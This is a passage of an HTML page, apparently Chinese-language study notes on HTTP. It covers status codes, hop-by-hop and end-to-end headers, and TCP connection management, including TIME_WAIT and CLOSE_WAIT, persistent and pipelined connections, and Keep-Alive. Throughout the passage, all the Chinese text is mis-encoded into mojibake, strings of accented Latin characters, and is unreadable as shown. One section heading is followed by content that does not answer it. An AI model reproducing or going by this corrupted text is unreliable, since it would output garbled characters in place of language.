href="#å¸¸ç”¨-HTTP-çŠ¶æ€ç " class="headerlink" title="å¸¸ç”¨ HTTP çŠ¶æ€ç "></a>å¸¸ç”¨ HTTP çŠ¶æ€ç </h2><ul><li>301ï¼šä»£è¡¨èµ„æºè¢«æ°¸ä¹…ç§»é™¤ï¼Œå“åº”çš„ Location é¦–éƒ¨ä¸­åº”è¯¥åŒ…å«èµ„æºç°åœ¨æ‰€å¤„çš„ URLã€‚</li><li>302ï¼šä»£è¡¨èµ„æºè¢«ä¸´æ—¶ç§»é™¤ï¼ˆä¸´æ—¶é‡å®šå‘ï¼‰</li><li>304ï¼šä»£è¡¨è‡ªä»ä¸Šæ¬¡è¯·æ±‚åï¼ŒæœåŠ¡ç«¯èµ„æºæœªå‘ç”Ÿå˜åŒ–ï¼Œå¯ä»¥ç›´æ¥ä»æœ¬åœ°ç¼“å­˜åŠ è½½ï¼Œé¿å…å¸¦å®½çš„æµªè´¹ã€‚</li><li>401ï¼šå½“å‰è¯·æ±‚æœªè¢«è®¤è¯ï¼Œå¯ä½œä¸ºä¸šåŠ¡çŠ¶æ€ç ï¼Œ</li><li>403ï¼šè¯·æ±‚ä¸è¢«å…è®¸ã€‚å¦‚ç”¨æˆ·æ— æƒé™è®¿é—®æŸä¸ªèµ„æº</li><li>404ï¼šè¯·æ±‚çš„èµ„æºæœªæ‰¾åˆ°</li><li>405ï¼šä¸æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ï¼Œå¦‚ä½¿ç”¨ TRACE æ–¹æ³•è¯·æ±‚ã€‚ä½¿ç”¨æ­¤çŠ¶æ€ç æ—¶ï¼Œåº”è¯¥åœ¨å“åº”ä¸­åŒ…å« Allow é¦–éƒ¨ï¼Œä»¥å‘ŠçŸ¥å®¢æˆ·ç«¯å¯¹æ‰€è¯·æ±‚çš„èµ„æºå…è®¸çš„æ–¹æ³•</li><li>408ï¼šè¯·æ±‚è¶…æ—¶</li><li>500ï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‚å»ºè®®ä»…åœ¨æ„å¤–æ—¶ä½¿ç”¨ï¼Œæ­¤æ—¶éœ€è¦äººå·¥ä»‹å…¥ä¿®å¤ã€‚</li><li>502ï¼šç½‘å…³é”™è¯¯</li><li>503ï¼šæœåŠ¡ä¸å¯ç”¨</li><li>504ï¼šç½‘å…³è¶…æ—¶</li></ul><h2 id="é¦–éƒ¨"><a href="#é¦–éƒ¨" class="headerlink" title="é¦–éƒ¨"></a>é¦–éƒ¨</h2><p>HTTP é¦–éƒ¨å­—æ®µå°†å®šä¹‰æˆç¼“å­˜ä»£ç†å’Œéç¼“å­˜ä»£ç†çš„è¡Œä¸ºï¼Œåˆ†æˆ 2 ç§ç±»å‹</p><ul><li>ç«¯å¯¹ç«¯é¦–éƒ¨(End-to-end)ï¼šåˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨ä¼šè½¬å‘ç»™è¯·æ±‚ / å“åº”å¯¹åº”çš„æœ€ç»ˆæ¥æ”¶ç›®æ ‡ï¼Œä¸”å¿…é¡»ä¿å­˜åœ¨æœ‰ç¼“å­˜ç”Ÿæˆçš„å“åº”ä¸­ï¼Œå¦å¤–è§„å®šå®ƒå¿…é¡»è¢«è½¬å‘</li><li>é€è·³é¦–éƒ¨(Hop-by-hop)ï¼šåˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨åªå¯¹å•æ¬¡è½¬å‘æœ‰æ•ˆï¼Œä¼šå› é€šè¿‡ç¼“å­˜æˆ–ä»£ç†è€Œä¸å†è½¬å‘ã€‚</li></ul><p>åœ¨ HTTP 1.1 ä¸­ï¼Œé™¤äº†<code>Connection</code>ã€<code>Keep-Alive</code>ã€<code>Proxy-Authenticate</code>ã€<code>Proxy-Authorization</code>ã€<code>Trailer</code>ã€<code>TE</code>ã€<code>Transfer-Encoding</code>ã€<code>Upgrade</code>ç­‰ 8 ä¸ªé€è·³é¦–éƒ¨å¤–ï¼Œå…¶ä½™éƒ½æ˜¯ç«¯å¯¹ç«¯é¦–éƒ¨ã€‚</p><h3 id="Connection-é¦–éƒ¨"><a href="#Connection-é¦–éƒ¨" class="headerlink" title="Connection é¦–éƒ¨"></a>Connection é¦–éƒ¨</h3><ul><li>æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µã€‚åœ¨å®¢æˆ·ç«¯å‘é€è¯·æ±‚å’ŒæœåŠ¡å™¨è¿”å›å“åº”å†…ï¼Œä½¿ç”¨ Connection é¦–éƒ¨å­—æ®µï¼Œå¯æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µï¼ˆå³ Hop-by-hop é¦–éƒ¨ï¼‰ã€‚</li><li>ç®¡ç†æŒä¹…è¿æ¥ã€‚HTTP/1.1 ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯æŒä¹…è¿æ¥ã€‚å½“æœåŠ¡å™¨æƒ³æ˜ç¡®æ–­å¼€è¿æ¥æ—¶ï¼Œåˆ™æŒ‡å®š Connection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Closeã€‚HTTP/1.1 ä¹‹å‰çš„ HTTP ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯éæŒä¹…è¿æ¥ï¼Œåˆ™éœ€è¦æŒ‡å®š Connection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Keep-Aliveã€‚</li></ul><h3 id="Accept-é¦–éƒ¨"><a href="#Accept-é¦–éƒ¨" class="headerlink" title="Accept é¦–éƒ¨"></a>Accept é¦–éƒ¨</h3><table><thead><tr><th>é¦–éƒ¨</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>Accept</code></td><td>å¯å¤„ç†çš„åª’ä½“ç±»å‹</td></tr><tr><td><code>Accept-Charset</code></td><td>å¯å¤„ç†çš„å­—ç¬¦é›†</td></tr><tr><td><code>Accept-Encoding</code></td><td>å¯å¤„ç†çš„ç¼–ç æ–¹å¼</td></tr><tr><td><code>Accept-Language</code></td><td>å¯å¤„ç†çš„è¯­è¨€</td></tr></tbody></table><h3 id="Upgrade-é¦–éƒ¨"><a href="#Upgrade-é¦–éƒ¨" class="headerlink" title="Upgrade é¦–éƒ¨"></a>Upgrade é¦–éƒ¨</h3><p>ç”¨äºæ£€æµ‹ HTTP åè®®åŠå…¶ä»–åè®®æ˜¯å¦å¯ä½¿ç”¨æ›´é«˜çš„ç‰ˆæœ¬è¿›è¡Œé€šä¿¡ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨ä¸åŒçš„é€šä¿¡åè®®ã€‚</p><h3 id="Via-é¦–éƒ¨"><a href="#Via-é¦–éƒ¨" class="headerlink" title="Via é¦–éƒ¨"></a>Via é¦–éƒ¨</h3><p>Via æ˜¯ä¸ºäº†è¿½è¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„ã€‚æŠ¥æ–‡ç»è¿‡ä»£ç†æˆ–ç½‘å…³æ—¶ï¼Œä¼šå…ˆåœ¨é¦–éƒ¨å­—æ®µ Via ä¸­é™„åŠ è¯¥æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åå†è¿›è¡Œè½¬å‘ã€‚é¦–éƒ¨å­—æ®µ Via ä¸ä»…ç”¨äºè¿½è¸ªæŠ¥æ–‡çš„è½¬å‘ï¼Œè¿˜å¯é¿å…è¯·æ±‚å›ç¯çš„å‘ç”Ÿã€‚æ‰€ä»¥å¿…é¡»åœ¨ç»è¿‡ä»£ç†æ—¶é™„åŠ è¯¥é¦–éƒ¨å­—æ®µå†…å®¹ã€‚<br>Via é¦–éƒ¨æ˜¯ä¸ºäº†è¿½è¸ªä¼ è¾“è·¯å¾„ï¼Œæ‰€ä»¥ç»å¸¸ä¼šå’Œ TRACE æ–¹æ³•ä¸€èµ·ä½¿ç”¨ã€‚</p><h3 id="æ¡ä»¶è¯·æ±‚é¦–éƒ¨"><a href="#æ¡ä»¶è¯·æ±‚é¦–éƒ¨" class="headerlink" title="æ¡ä»¶è¯·æ±‚é¦–éƒ¨"></a>æ¡ä»¶è¯·æ±‚é¦–éƒ¨</h3><table><thead><tr><th>é¦–éƒ¨</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>Expect</code></td><td></td></tr><tr><td><code>If-Match</code></td><td>è‹¥åŒ¹é…åˆ™è·å–è¯¥èµ„æº</td></tr><tr><td><code>If-Modified-Since</code></td><td>è‹¥ä»æŸä¸ªæ—¶é—´åä¿®æ”¹åˆ™è·å–</td></tr><tr><td><code>If-None-Match</code></td><td>è‹¥ä¸åŒ¹é…åˆ™è·å–</td></tr><tr><td><code>If-Range</code></td><td>æŒ‡å®šèŒƒå›´è·å–</td></tr><tr><td><code>If-Unmodified-Since</code></td><td>è‹¥ä»æŸä¸ªæ—¶é—´åæœªä¿®æ”¹åˆ™è·å–</td></tr></tbody></table><h3 id="å†…å®¹é¦–éƒ¨"><a href="#å†…å®¹é¦–éƒ¨" class="headerlink" title="å†…å®¹é¦–éƒ¨"></a>å†…å®¹é¦–éƒ¨</h3><table><thead><tr><th>é¦–éƒ¨</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>Content-Encoding</code></td><td>ä¸»ä½“çš„ç¼–ç æ–¹å¼ï¼Œå¦‚ gzip</td></tr><tr><td><code>Content-Language</code></td><td>ä¸»ä½“çš„æœ€ä½³è¯­è¨€</td></tr><tr><td><code>Content-Length</code></td><td>ä¸»ä½“çš„é•¿åº¦æˆ–å°ºå¯¸</td></tr><tr><td><code>Content-Location</code></td><td>èµ„æºå®é™…ä½ç½®</td></tr><tr><td><code>Content-Type</code></td><td>è¯¥ä¸»ä½“çš„å¯¹è±¡ç±»å‹</td></tr><tr><td><code>Content-Range</code></td><td>åœ¨æ•´ä¸ªèµ„æºä¸­æ­¤å®ä½“è¡¨ç¤ºçš„å­—èŠ‚èŒƒå›´</td></tr></tbody></table><h1 id="ç¬¬4ç« -è¿æ¥ç®¡ç†"><a href="#ç¬¬4ç« -è¿æ¥ç®¡ç†" class="headerlink" title="ç¬¬4ç«  è¿æ¥ç®¡ç†"></a>ç¬¬4ç«  è¿æ¥ç®¡ç†</h1><p>TCP è¿æ¥é€šè¿‡&lt;source ip, source port, destn ip, destn port&gt; å”¯ä¸€å®šä¹‰ä¸€ä¸ªè¿æ¥ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gacjkgnhr4j30wo0u04ho.jpg" alt=""></p><p>å•ä¸ª HTTP æ—¶å»¶å¦‚ä¸‹å›¾ï¼š<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gacjzsn0wnj31780fidkv.jpg" alt=""></p><p>ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸TCP çš„å»ºç«‹ã€ä¼ è¾“è¯·æ±‚ä¸å“åº”æŠ¥æ–‡ç›¸æ¯”ï¼Œäº‹åŠ¡å¤„ç†çš„æ—¶é—´å¾ˆçŸ­ã€‚é€ æˆ HTTP æ—¶å»¶çš„ä¸»è¦åŸå› æœ‰ï¼š</p><ul><li>DNS è§£æ</li><li>TCP è¿æ¥çš„å»ºç«‹</li><li>æœåŠ¡ç«¯å¯¹è¯·æ±‚çš„å¤„ç†</li></ul><p>å¸¸è§çš„å½±å“ TCP æ—¶å»¶çš„å› ç´ åŒ…æ‹¬ï¼š</p><ul><li>TCP è¿æ¥å»ºç«‹æ¡æ‰‹</li><li>TCP æ…¢å¯åŠ¨æ‹¥å¡æ§åˆ¶<ul><li>TCP è¿æ¥ä¼šéšç€æ—¶é—´è¿›è¡Œè‡ªæˆ‘â€œè°ƒè°â€ï¼Œèµ·åˆä¼šé™åˆ¶è¿æ¥çš„æœ€å¤§é€Ÿåº¦ï¼Œå¦‚æœæ•°æ®ä¼ è¾“æˆåŠŸï¼Œä¼šéšç€æ—¶é—´çš„æ¨ç§»æé«˜ä¼ è¾“çš„é€Ÿåº¦ã€‚è¯¥è°ƒè°å³ä¸º TCP æ…¢å¯åŠ¨ï¼Œç”¨äºé˜²æ­¢å› ç‰¹ç½‘çš„çªç„¶è¿‡è½½å’Œæ‹¥å¡ã€‚</li></ul></li><li>æ•°æ®èšé›†çš„ Nagle ç®—æ³•<ul><li>è¯¥ç®—æ³•è®©æ•°æ®åœ¨ç¼“å†²åˆ°ä¸€å®šå°ºå¯¸åå‘é€ï¼Œè‹¥å¤§é‡å°å—æ•°æ®åˆ™ä¼šé€ æˆä¸¥é‡çš„å»¶æ—¶ã€‚å½“ç¡®ä¿å‘ TCP å†™å…¥å¤§å—æ•°æ®æ—¶ï¼Œå¯ä»¥ç¦ç”¨ Nagle ç®—æ³•</li></ul></li><li>ç”¨äºæå¸¦ç¡®è®¤çš„ TCP å»¶è¿Ÿç¡®è®¤ç®—æ³•<ul><li>è‹¥åœ¨æŒ‡å®šæ—¶é—´çª—å£å†…æœªæ”¶åˆ°ç¡®è®¤åˆ†ç»„ï¼Œåˆ™é‡æ–°å‘é€åˆ†ç»„æ•°æ®ã€‚ç”±äºåˆ†ç»„æ•°æ®è¾ƒå°‘ï¼Œå› æ­¤åœ¨æŸä¸ªæ—¶é—´çª—å£å†…å­˜æ”¾äºç¼“å†²åŒºï¼Œå¾…åŒºæ»¡åå‘é€ï¼›æ—¶é—´çª—å£å†…æœªæ»¡åˆ™å•ç‹¬å‘é€ã€‚</li></ul></li><li>TIME_WAIT æ—¶å»¶å’Œç«¯å£è€—å°½</li></ul><p>æ ¹æ®ä»¥ä¸Šæƒ…å†µï¼Œæˆ‘ä»¬å¯å¾—åˆ°ä¼˜åŒ–çš„æ–¹å‘ï¼š</p><ul><li>å°†å¤šä¸ªè¯·æ±‚è¿›è¡Œåˆå¹¶ï¼Œé¿å…é¢‘ç¹å»ºç«‹è¿æ¥</li><li>ä¼˜åŒ– TCPï¼ŒåŠ é€Ÿè¿æ¥çš„å»ºç«‹</li></ul><h2 id="TIME-WAIT-ä¸-CLOSE-WAIT"><a href="#TIME-WAIT-ä¸-CLOSE-WAIT" class="headerlink" title="TIME_WAIT ä¸ CLOSE_WAIT"></a>TIME_WAIT ä¸ CLOSE_WAIT</h2><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gade8xlrirj30kc0fnq44.jpg" alt=""><br>ä»ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒTIME_WAIT å‡ºç°åœ¨ä¸»åŠ¨å…³é—­æ–¹ï¼ŒCLOSE_WAIT åˆ™å‡ºç°åœ¨è¢«åŠ¨å…³é—­æ–¹ï¼ˆä¸¤ä¸ªé€šè¯ç»“æŸçš„äººï¼Œå…ˆæŒ‚æ–­ç”µè¯çš„ä¸€æ–¹è¿›å…¥TIME_WAITï¼Œå¦ä¸€æ–¹åˆ™è¿›å…¥CLOSE_WAITï¼‰ã€‚</p><h3 id="TIME-WAIT-äº§ç”Ÿçš„åœºæ™¯"><a href="#TIME-WAIT-äº§ç”Ÿçš„åœºæ™¯" class="headerlink" title="TIME_WAIT äº§ç”Ÿçš„åœºæ™¯"></a>TIME_WAIT äº§ç”Ÿçš„åœºæ™¯</h3><p>åŸºäº TCP çš„ HTTP åè®®ï¼Œä¸€èˆ¬ç”±æœåŠ¡ç«¯ä¸»åŠ¨å…³é—­ TCPï¼ˆkeepalive æ—¶é—´å†…å®¢æˆ·ç«¯ä¸»åŠ¨å…³é—­åˆ™æ˜¯å®¢æˆ·ç«¯è¿›å…¥ TIME_WAITï¼‰ï¼Œè¿™æ ·æœåŠ¡ç«¯å°±ä¼šè¿›å…¥ TIME_WAIT çŠ¶æ€ã€‚å½“æœåŠ¡ç«¯å‡ºç°å¤§é‡è¯·æ±‚æ—¶ï¼Œå°±ä¼šäº§ç”Ÿå¤§é‡çš„ TIME_WAIT çŠ¶æ€ã€‚å¦‚æœå †ç§¯çš„å¤§é‡TIME_WAITä¸åŠæ—¶å¤„ç†ï¼Œå¯èƒ½ä¼šé€ æˆæœåŠ¡ç«¯æ— æ³•æ¥æ”¶æ–°çš„è¯·æ±‚ã€‚</p><h3 id="CLOSE-WAIT-äº§ç”Ÿçš„åœºæ™¯"><a href="#CLOSE-WAIT-äº§ç”Ÿçš„åœºæ™¯" class="headerlink" title="CLOSE_WAIT äº§ç”Ÿçš„åœºæ™¯"></a>CLOSE_WAIT äº§ç”Ÿçš„åœºæ™¯</h3><p>çˆ¬è™«è¿è¡Œåœ¨ A ä¸»æœºï¼Œå‘ B ä¸»æœºé‡‡é›†æ•°æ®ï¼Œä½†æ˜¯ A å¾ˆå¿«å°±å‘ç°å‡ºç°äº†å¤§é‡çš„ CLOSE_WAIT çŠ¶æ€çš„è¿æ¥ï¼Œç»æ£€æŸ¥å‘ç°è¿™äº›å¤„äº CLOSE_WAIT çŠ¶æ€çš„è¯·æ±‚ç»“æœéƒ½æ˜¯ 404ã€‚è¿™æ˜¯ç”±äºï¼Œåœ¨ 404 çš„çŠ¶æ€ä¸‹ï¼ŒB ä¸»åŠ¨å…³é—­äº†è¿æ¥ï¼ŒA è¿›å…¥äº†CLOSE_WAITï¼Œå¦‚æœ A çš„ç¨‹åºä¸­æœªèƒ½é‡Šæ”¾ HTTP è¿æ¥ï¼Œåˆ™é€ æˆäº†CLOSE_WAITã€‚</p><blockquote><p>å°ç–‘æƒ‘ï¼šTIME_WAIT ä¸ CLOSE_WAIT æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œå³é€šä¿¡æ˜¯ç”±åŒæ–¹å®Œæˆçš„ï¼Œå› æ­¤ï¼Œå…¶ä¸­ä¸€æ–¹å‡ºç°äº†TIME_WAIT æˆ– CLOSE_WAITï¼Œåˆ™å¦ä¸€æ–¹å¿…ç„¶å‡ºç°ä¸ä¹‹å¯¹ç«‹çš„çŠ¶æ€ã€‚</p></blockquote><h3 id="ä¸ºä»€ä¹ˆéœ€è¦TIME-WAIT-ä¸-CLOSE-WAIT-å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦TIME-WAIT-ä¸-CLOSE-WAIT-å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦TIME_WAIT ä¸ CLOSE_WAIT å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦TIME_WAIT ä¸ CLOSE_WAIT å‘¢ï¼Ÿ</h3><p>å½“ä¸€ä¸ª socket å…³é—­çš„æ—¶å€™ï¼Œæ˜¯é€šè¿‡ä¸¤ç«¯å››æ¬¡æ¡æ‰‹å®Œæˆçš„ï¼Œå½“ä¸€ç«¯è°ƒç”¨ close() æ—¶ï¼Œå°±è¯´æ˜æœ¬ç«¯æ²¡æœ‰æ•°æ®è¦å‘é€äº†ã€‚è¿™å¥½ä¼¼çœ‹æ¥åœ¨æ¡æ‰‹å®Œæˆä»¥åï¼Œsocket å°±éƒ½å¯ä»¥å¤„äºåˆå§‹çš„ CLOSED çŠ¶æ€äº†ï¼Œå…¶å®ä¸ç„¶ã€‚åŸå› æ˜¯è¿™æ ·å®‰æ’çŠ¶æ€æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬æ²¡æœ‰ä»»ä½•æœºåˆ¶ä¿è¯æœ€åçš„ä¸€ä¸ª ACK èƒ½å¤Ÿæ­£å¸¸ä¼ è¾“ï¼Œç¬¬äºŒï¼Œç½‘ç»œä¸Šä»ç„¶æœ‰å¯èƒ½æœ‰æ®‹ä½™çš„æ•°æ®åŒ…ï¼ˆæ®‹ç•™çš„æ•°æ®åŒ…ç»2MSLæ—¶é—´ä¸¢å¼ƒï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿå¿…é¡»èƒ½å¤Ÿæ­£å¸¸å¤„ç†ã€‚</p><h3 id="å¦‚æœå·²ç»è¿›å…¥TIME-WAIT-ä¸-CLOSE-WAITè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥æ¥ä¸‹æ¥ä¼šè¢«æ€æ ·å¤„ç†å‘¢ï¼Ÿ"><a href="#å¦‚æœå·²ç»è¿›å…¥TIME-WAIT-ä¸-CLOSE-WAITè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥æ¥ä¸‹æ¥ä¼šè¢«æ€æ ·å¤„ç†å‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœå·²ç»è¿›å…¥TIME_WAIT ä¸ CLOSE_WAITè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥æ¥ä¸‹æ¥ä¼šè¢«æ€æ ·å¤„ç†å‘¢ï¼Ÿ"></a>å¦‚æœå·²ç»è¿›å…¥TIME_WAIT ä¸ CLOSE_WAITè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥æ¥ä¸‹æ¥ä¼šè¢«æ€æ ·å¤„ç†å‘¢ï¼Ÿ</h3><p>ç›®å‰ä¼˜åŒ– HTTP èµ„æºåŠ è½½é€Ÿåº¦çš„æ–¹å¼æœ‰</p><ul><li>å¹¶è¡Œè¿æ¥<ul><li>å¹¶è¡Œè¿æ¥é€‚ç”¨äºæ€»æ•°è¾ƒå°ï¼ˆé€šå¸¸æ˜¯ 4 ä¸ªï¼‰çš„æƒ…å†µï¼Œå¦‚æœä¸€ä¸ªé¡µé¢æœ‰ 100 ä¸ªå›¾ç‰‡ï¼Œä½¿ç”¨å¹¶è¡Œçš„æ–¹å¼å¤„ç†çš„è¯ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯è¦æ‰“å¼€ 100 ä¸ªè¿æ¥ï¼Œ100 ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨åˆ™éœ€è¦å¤„ç† 10000 ä¸ªè¿æ¥ï¼Œè¿™é€ æˆäº†æœåŠ¡å™¨æ€§èƒ½çš„ä¸¥é‡ä¸‹é™ã€‚è¯·å‹¿æ»¥ç”¨å¹¶è¡Œè¿æ¥ã€‚</li><li>å¹¶è¡Œè¿æ¥çš„ç¼ºç‚¹<ul><li>æ¯ä¸ªäº‹åŠ¡éƒ½ä¼šæ‰“å¼€/å…³é—­ä¸€æ¡æ–°çš„è¿æ¥ï¼Œä¼šè€—è´¹æ—¶é—´å’Œå®½å¸¦</li><li>ç”±äº TCP æ…¢å¯åŠ¨ç‰¹æ€§çš„å­˜åœ¨ï¼Œæ¯æ¡æ–°çš„è¿æ¥æ€§èƒ½éƒ½ä¼šæœ‰æ‰€é™ä½</li><li>å¯æ‰“å¼€çš„å¹¶è¡Œè¿æ¥æ•°é‡å®é™…ä¸Šæ˜¯æœ‰é™çš„</li></ul></li></ul></li><li>æŒä¹…è¿æ¥<ul><li>ç”±äºåˆå§‹åŒ–äº†å¯¹æŸæœåŠ¡å™¨ HTTP è¯·æ±‚çš„åº”ç”¨ç¨‹åºå¾ˆå¯èƒ½ä¼šåœ¨ä¸ä¹…çš„å°†æ¥å¯¹é‚£å°æœåŠ¡å™¨å‘èµ·æ›´å¤šçš„è¯·æ±‚ï¼ˆç«™ç‚¹å±€éƒ¨æ€§ site localityï¼‰ï¼Œå› æ­¤æŒä¹…è¿æ¥é€‚ç”¨äºå¯¹åŒä¸€ä¸ªç«™ç‚¹å¤šæ¬¡è·å–èµ„æºï¼ˆå¦‚ 12306 è´­ç¥¨ï¼Ÿæ·˜å®è´­ç‰©ï¼Ÿï¼‰ã€‚</li><li>é‡ç”¨å·²å¯¹ç›®æ ‡æœåŠ¡å™¨æ‰“å¼€çš„ç©ºé—²æŒä¹…è¿æ¥ï¼Œå°±å¯ä»¥é¿å¼€ç¼“æ…¢çš„è¿æ¥å»ºç«‹é˜¶æ®µã€‚è€Œä¸”ï¼Œå·²ç»æ‰“å¼€çš„è¿æ¥è¿˜å¯ä»¥é¿å…æ…¢å¯åŠ¨çš„æ‹¥å¡é€‚åº”é˜¶æ®µï¼Œä»¥ä¾¿æ›´å¿«é€Ÿåœ°è¿›è¡Œæ•°æ®çš„ä¼ è¾“ã€‚</li><li>ç®¡ç†æŒä¹…è¿æ¥æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œé¿å…å‡ºç°å¤§é‡ç©ºé—²è¿æ¥ï¼Œè€—è´¹æœ¬åœ°åŠè¿œç¨‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„èµ„æº</li><li><strong>åœ¨ HTTP 1.1 ä¸­ï¼ŒæŒä¹…è¿æ¥æ—¶é»˜è®¤æ¿€æ´»çš„ï¼Œ ä¸»åŠ¨å…³é—­è¿æ¥æ—¶å‘æŠ¥æ–‡ä¸­æ˜¾ç¤ºæ·»åŠ <code>Connection: close</code></strong>ã€‚å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä»å¯ä»¥éšæ—¶å…³é—­ç©ºé—²è¿æ¥ï¼Œå¹¶éä¸å‘é€ close å°±æ°¸ä¹…ä¿æŒè¿æ¥ã€‚</li><li>ä¸€ä¸ªç”¨æˆ·å®¢æˆ·ç«¯å¯¹ä»»ä½•æœåŠ¡å™¨æˆ–ä»£ç†æœ€å¤šåªèƒ½ç»´æŠ¤ä¸¤æ¡æŒä¹…è¿æ¥ï¼Œä»¥å…æœåŠ¡å™¨è¿‡è½½ã€‚</li></ul></li><li>ç®¡é“åŒ–è¿æ¥<ul><li>å¦‚æœHTTPå®¢æˆ·ç«¯æ— æ³•ç¡®è®¤è¿æ¥æ˜¯æŒä¹…çš„ï¼Œå°±ä¸åº”è¯¥ä½¿ç”¨ç®¡é“ã€‚</li><li>å¿…é¡»æŒ‰ç…§ä¸è¯·æ±‚ç›¸åŒçš„é¡ºåºå›é€HTTPå“åº”ã€‚</li><li>HTTPå®¢æˆ·ç«¯å¿…é¡»åšå¥½è¿æ¥ä¼šåœ¨ä»»æ„æ—¶åˆ»å…³é—­çš„å‡†å¤‡ï¼Œè¿˜è¦å‡†å¤‡å¥½é‡å‘æ‰€æœ‰æœªå®Œæˆçš„ç®¡é“åŒ–è¯·æ±‚ã€‚å¦‚æœå®¢æˆ·ç«¯æ‰“å¼€äº†ä¸€æ¡æŒä¹…è¿æ¥ï¼Œå¹¶ç«‹å³å‘å‡ºäº†10æ¡è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½åœ¨å¤„ç†5æ¡è¯·æ±‚ä¹‹åå…³é—­è¿æ¥ã€‚å‰©ä¸‹çš„5æ¡è¯·æ±‚ä¼šå¤±è´¥ï¼Œå®¢æˆ·ç«¯å¿…é¡»èƒ½å¤Ÿåº”å¯¹è¿™äº›è¿‡æ—©å…³é—­è¿æ¥çš„æƒ…å†µï¼Œé‡æ–°å‘å‡ºè¿™äº›è¯·æ±‚ã€‚</li><li>HTTPå®¢æˆ·ç«¯ä¸åº”è¯¥ç”¨ç®¡é“åŒ–çš„æ–¹å¼å‘é€ä¼šäº§ç”Ÿå‰¯ä½œç”¨çš„è¯·æ±‚(æ¯”å¦‚POST).æ€»ä¹‹ï¼Œå‡ºé”™çš„æ—¶å€™ï¼Œç®¡é“åŒ–æ–¹å¼ä¼šé˜»ç¢å®¢æˆ·ç«¯äº†è§£æœåŠ¡å™¨æ‰§è¡Œçš„æ˜¯ä¸€ç³»åˆ—ç®¡é“åŒ–è¯·æ±‚ä¸­çš„å“ªä¸€äº›ã€‚ç”±äºæ— æ³•å®‰å…¨åœ°é‡è¯•POSTè¿™æ ·çš„éå¹•ç­‰è¯·æ±‚ï¼Œæ‰€ä»¥å‡ºé”™æ—¶ï¼Œå°±å­˜åœ¨æŸäº›æ–¹æ³•æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œçš„é£é™©ã€‚</li></ul></li></ul><p>å¦‚æœæœåŠ¡å™¨æ„¿æ„ä¸ºä¸‹ä¸€æ¡è¯·æ±‚å°†è¿æ¥ä¿æŒåœ¨æ‰“å¼€çŠ¶æ€ï¼Œå°±åœ¨å“åº”ä¸­åŒ…å«ç›¸åŒçš„é¦–éƒ¨ï¼Œè‹¥å“åº”ä¸­æ²¡æœ‰ <code>Connection: Keep-Alive</code> é¦–éƒ¨ï¼Œå®¢æˆ·ç«¯å°±è®¤ä¸ºæœåŠ¡å™¨ä¸æ”¯æŒ keep-aliveï¼Œä¼šåœ¨å‘å›å“åº”æŠ¥æ–‡ä¹‹åå…³é—­è¿æ¥ã€‚<code>Keep-Alive:  max=5, timeout=120</code>é¦–éƒ¨ä¸­çš„å€¼éƒ½ä»…ä»…æ˜¯é¢„ä¼°å€¼ï¼Œå¹¶ä¸æ˜¯æ‰¿è¯ºå€¼ï¼Œå³ï¼Œè™½ç„¶å£°æ˜æœåŠ¡å™¨å¯èƒ½ä¿æŒæ´»è·ƒçŠ¶æ€åœ¨120s å†…ï¼Œä½†å¯èƒ½ 20s å°±å…³é—­äº†ã€‚</p><p>ç°ä»£ä»£ç†ä¸åº”è¯¥è½¬å‘çš„ä¸€äº›HTTPé¦–éƒ¨åŒ…æ‹¬ï¼šConnection,  Proxy-Authenticate, Proxy-Connection, Transfer-Encoding å’Œ Upgradeã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gadn0sgnwmj30u00usncj.jpg" alt=""></p><h2 id="å…³äºè¿æ¥å…³é—­"><a href="#å…³äºè¿æ¥å…³é—­" class="headerlink" title="å…³äºè¿æ¥å…³é—­"></a>å…³äºè¿æ¥å…³é—­</h2><p>æ‰€æœ‰ HTTP 